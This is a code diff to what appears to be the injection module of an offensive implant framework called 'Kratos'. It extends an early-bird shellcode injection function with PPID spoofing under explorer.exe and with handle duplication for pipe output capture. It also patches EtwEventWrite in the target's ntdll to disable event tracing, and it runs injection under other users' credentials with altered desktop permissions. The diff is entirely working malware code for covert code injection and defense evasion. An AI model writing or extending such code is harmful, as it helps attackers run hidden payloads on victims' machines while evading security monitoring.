@@ -1,5 +1,6 @@
 #define _WIN32_WINNT 0x0601
 #include "inject.h"
+#include "utils.h"
 #ifdef EVASION_SYSCALLS
 #include "evasion.h"
 #endif
@@ -59,44 +60,57 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
         wcsncpy(whost_full, whost_name, 511);
     }
 
-    /* Temp file for output capture: stdout+stderr merged, no pipe deadlock.
-     * Must be created before the attribute list.
-     * Note: PPID spoofing (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS) causes the child to
-     * inherit handles from the spoofed parent, not from Kratos. PROC_THREAD_ATTRIBUTE_HANDLE_LIST
-     * would need handles valid in the parent process's table (not ours), which requires
-     * DuplicateHandle into explorer.exe. Skip PPID spoof when capturing output to keep
-     * standard bInheritHandles=TRUE inheritance working correctly. */
-    HANDLE hCaptureFile = NULL;
-    out->output_file[0] = '\0';
-    if (capture_output) {
-        char tmp_dir[MAX_PATH] = {0};
-        GetTempPathA(MAX_PATH, tmp_dir);
-        GetTempFileNameA(tmp_dir, "ea_", 0, out->output_file);
-        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-        hCaptureFile = CreateFileA(out->output_file, GENERIC_WRITE, FILE_SHARE_READ,
-                                   &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
-        if (hCaptureFile == INVALID_HANDLE_VALUE) {
-            hCaptureFile = NULL;
-            out->output_file[0] = '\0';
-        }
-    }
-
-    /* PPID spoof: explorer.exe - disabled when capture_output is set (handle inheritance conflict) */
-    DWORD  spoof_pid = capture_output ? 0 : find_explorer_pid();
+    /* PPID spoof: open explorer with PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE.
+     * PROCESS_DUP_HANDLE lets us copy pipe write-ends into explorer's handle table so
+     * the child (whose inherited handles come from the spoofed parent) can write to them. */
+    DWORD  spoof_pid = find_explorer_pid();
     HANDLE hParent   = NULL;
     if (spoof_pid) {
 #ifdef EVASION_SYSCALLS
-        NTSTATUS _st = kratos_NtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, spoof_pid);
+        NTSTATUS _st = kratos_NtOpenProcess(&hParent,
+                           PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, spoof_pid);
         if (!NT_SUCCESS(_st)) hParent = NULL;
 #else
-        hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
+        hParent = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, spoof_pid);
 #endif
     }
 
-    /* Attribute list: PPID spoof + BlockDLLs only.
-     * No HANDLE_LIST: bInheritHandles=TRUE with SECURITY_ATTRIBUTES.bInheritHandle on hCaptureFile
-     * is sufficient. The child's inherited copy of hCaptureFile is closed when the child exits;
-     * this does not affect Kratos's handle table (inherited handles are duplicates, not aliases). */
+    /* Anonymous pipe for output capture.
+     * If PPID spoof is active, duplicate the write-ends into the parent's handle space:
+     * the child inherits handles from its "parent" (explorer), not from Kratos, so our
+     * local handles would not be inherited. The duplicated copies live in explorer's table
+     * and are inherited correctly. */
+    HANDLE hPipeRead  = NULL;
+    HANDLE hPipeWrite = NULL;
+    HANDLE hNullIn    = NULL;
+    HANDLE hDupWrite  = NULL;  /* write-end duplicated into hParent's handle space */
+    HANDLE hDupNullIn = NULL;  /* stdin null duplicated into hParent's handle space */
+    out->hPipeRead = NULL;
+    if (capture_output) {
+        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
+        if (CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
+            SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0);
+            hNullIn = CreateFileA("nul", GENERIC_READ,
+                                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                  &sa, OPEN_EXISTING, 0, NULL);
+            if (hParent) {
+                if (!DuplicateHandle(GetCurrentProcess(), hPipeWrite,
+                                     hParent, &hDupWrite,
+                                     0, TRUE, DUPLICATE_SAME_ACCESS))
+                    hDupWrite = NULL;
+                if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) {
+                    if (!DuplicateHandle(GetCurrentProcess(), hNullIn,
+                                         hParent, &hDupNullIn,
+                                         0, TRUE, DUPLICATE_SAME_ACCESS))
+                        hDupNullIn = NULL;
+                }
+            }
+        } else {
+            hPipeRead = NULL; hPipeWrite = NULL;
+        }
+    }
+
+    /* Attribute list: PPID spoof + BlockDLLs. */
     int     attr_count = (hParent ? 1 : 0) + (g_blockdlls ? 1 : 0);
     BOOL    use_attr   = FALSE;
     LPPROC_THREAD_ATTRIBUTE_LIST attr = NULL;
@@ -126,17 +140,23 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
     else
         wcsncpy(wcmdline, whost_full, 2047);
 
+    /* Choose which handle values go into STARTF_USESTDHANDLES.
+     * If we have duplicates in parent's space, use those (child inherits from parent).
+     * Fallback to our local handles if duplication failed (no PPID spoof or DupHandle failed). */
+    HANDLE hStdOut = hDupWrite  ? hDupWrite  : hPipeWrite;
+    HANDLE hStdIn  = hDupNullIn ? hDupNullIn : ((hNullIn && hNullIn != INVALID_HANDLE_VALUE) ? hNullIn : NULL);
+
     STARTUPINFOEXW siex;
     ZeroMemory(&siex, sizeof(siex));
     siex.StartupInfo.cb          = use_attr ? (DWORD)sizeof(siex) : (DWORD)sizeof(STARTUPINFOW);
     siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
     siex.StartupInfo.wShowWindow = SW_HIDE;
     if (use_attr) siex.lpAttributeList = attr;
-    if (hCaptureFile) {
+    if (hStdOut) {
         siex.StartupInfo.dwFlags   |= STARTF_USESTDHANDLES;
-        siex.StartupInfo.hStdOutput = hCaptureFile;
-        siex.StartupInfo.hStdError  = hCaptureFile;
-        siex.StartupInfo.hStdInput  = NULL;
+        siex.StartupInfo.hStdOutput = hStdOut;
+        siex.StartupInfo.hStdError  = hStdOut;
+        siex.StartupInfo.hStdInput  = hStdIn;
     }
 
     PROCESS_INFORMATION pi;
@@ -144,16 +164,24 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
     DWORD cflags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
     if (use_attr) cflags |= EXTENDED_STARTUPINFO_PRESENT;
 
+    /* bInheritHandles=TRUE so the child inherits the handles from its "parent" handle table */
     BOOL ok = CreateProcessW(whost_full, wcmdline, NULL, NULL,
-                             hCaptureFile ? TRUE : FALSE,
+                             (hStdOut != NULL) ? TRUE : FALSE,
                              cflags, NULL, NULL, &siex.StartupInfo, &pi);
     if (use_attr) { DeleteProcThreadAttributeList(attr); HeapFree(GetProcessHeap(), 0, attr); }
+
+    /* Close our local copies of the write-ends; child (via parent's table) already has them */
+    if (hPipeWrite)  CloseHandle(hPipeWrite);
+    if (hNullIn && hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);
+    /* Remove the duplicated copies from parent's handle table (child already inherited them) */
+    if (hDupWrite && hParent)
+        DuplicateHandle(hParent, hDupWrite, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
+    if (hDupNullIn && hParent)
+        DuplicateHandle(hParent, hDupNullIn, NULL, NULL, 0, FALSE, DUPLICATE_CLOSE_SOURCE);
     if (hParent) CloseHandle(hParent);
-    /* Close parent's copy - child inherited it; we read the file after process exit */
-    if (hCaptureFile) CloseHandle(hCaptureFile);
 
     if (!ok) {
-        if (out->output_file[0]) DeleteFileA(out->output_file);
+        if (hPipeRead) CloseHandle(hPipeRead);
         snprintf(errmsg, errmsg_len, "Error: CreateProcess(%s) failed (%lu)",
                  g_spawnto_path, GetLastError());
         return 0;
@@ -230,11 +258,33 @@ int earlybird_inject(const unsigned char *shellcode, size_t shellcode_len,
     }
 #endif
 
+    /* Patch EtwEventWrite in the child's ntdll before resuming.
+     * ntdll is mapped at the same base in all processes within the session (boot-time ASLR),
+     * so GetProcAddress in our process gives the valid address in the child too. */
+    {
+        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+        if (hNtdll) {
+            FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
+            if (pEtw) {
+                static const BYTE etw_patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax,eax; ret */
+                DWORD old_prot = 0;
+                if (VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
+                                     PAGE_EXECUTE_READWRITE, &old_prot)) {
+                    WriteProcessMemory(pi.hProcess, (LPVOID)pEtw,
+                                       etw_patch, sizeof(etw_patch), NULL);
+                    VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
+                                     old_prot, &old_prot);
+                }
+            }
+        }
+    }
+
     ResumeThread(pi.hThread);
 
-    out->hProcess = pi.hProcess;
-    out->hThread  = pi.hThread;
-    out->pid      = pi.dwProcessId;
+    out->hProcess  = pi.hProcess;
+    out->hThread   = pi.hThread;
+    out->pid       = pi.dwProcessId;
+    out->hPipeRead = hPipeRead;
     return 1;
 }
 
@@ -261,23 +311,39 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
     wchar_t wdomain[256] = {0};
     wchar_t wpass[256]   = {0};
     MultiByteToWideChar(CP_UTF8, 0, username, -1, wuser, 256);
-    MultiByteToWideChar(CP_UTF8, 0, (domain && domain[0]) ? domain : ".", -1, wdomain, 256);
     MultiByteToWideChar(CP_UTF8, 0, password, -1, wpass, 256);
+    /* NULL domain = Windows auto-resolves (like runas /netonly without /domain).
+     * "." = local machine only. Pass NULL when no domain specified so domain
+     * accounts like j.walsh resolve correctly without needing the NetBIOS name. */
+    int use_domain = (domain && domain[0] && strcmp(domain, ".") != 0);
+    if (use_domain)
+        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdomain, 256);
 
     wchar_t wcmdline[2048] = {0};
     wcsncpy(wcmdline, whost_full, 2047);
+
+    /* Add user SID to window station + desktop DACLs before spawning */
+    char desktop_name[320] = {0};
+    grant_winsta_desktop_access(username,
+                                use_domain ? domain : NULL,
+                                desktop_name, sizeof(desktop_name));
 
     STARTUPINFOW si;
     ZeroMemory(&si, sizeof(si));
     si.cb          = sizeof(si);
     si.dwFlags     = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
+    if (desktop_name[0]) {
+        wchar_t wdesktop[320] = {0};
+        MultiByteToWideChar(CP_UTF8, 0, desktop_name, -1, wdesktop, 320);
+        si.lpDesktop = wdesktop;
+    }
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
 
     BOOL ok = CreateProcessWithLogonW(
-        wuser, wdomain, wpass,
+        wuser, use_domain ? wdomain : NULL, wpass,
         LOGON_WITH_PROFILE,
         whost_full, wcmdline,
         CREATE_SUSPENDED | CREATE_NO_WINDOW,
@@ -286,7 +352,7 @@ int earlybird_inject_asuser(const unsigned char *shellcode, size_t shellcode_len
     );
     if (!ok) {
         snprintf(errmsg, errmsg_len, "Error: CreateProcessWithLogonW(%s\\%s) failed (%lu)",
-                 domain && domain[0] ? domain : ".", username, GetLastError());
+                 use_domain ? domain : "*", username, GetLastError());
         return 0;
     }
 
